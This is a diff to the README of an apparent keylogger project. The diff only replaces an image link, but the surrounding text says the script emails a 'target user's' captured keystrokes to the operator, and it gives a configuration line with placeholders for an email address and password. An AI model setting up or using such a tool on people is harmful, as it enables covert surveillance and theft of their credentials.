@@ -6,6 +6,4 @@ In current version, <br>
 Once the target user is affected by the script it sends us an email of its key log at a time interval which can edit from inside the script file.  
 `keylogger = Keylogger([TIME_INTERVAL_GOES_HERE], "[YOUR_EMAIL_HERE]", "[EMAIL_PASSWORD_HERE]")` <br>
 
-<br>
-<br>
-![148632393-ec22b612-d75e-4c7a-be4d-131bc31b3c31](https://user-images.githubusercontent.com/90370604/148632417-d2a21e9e-d5f2-426f-b534-a7dff4e6aceb.jpg)
+![version3](https://user-images.githubusercontent.com/90370604/148632606-9dd6dfbf-7d90-4ec3-8be1-4e5e8242a92f.jpg)
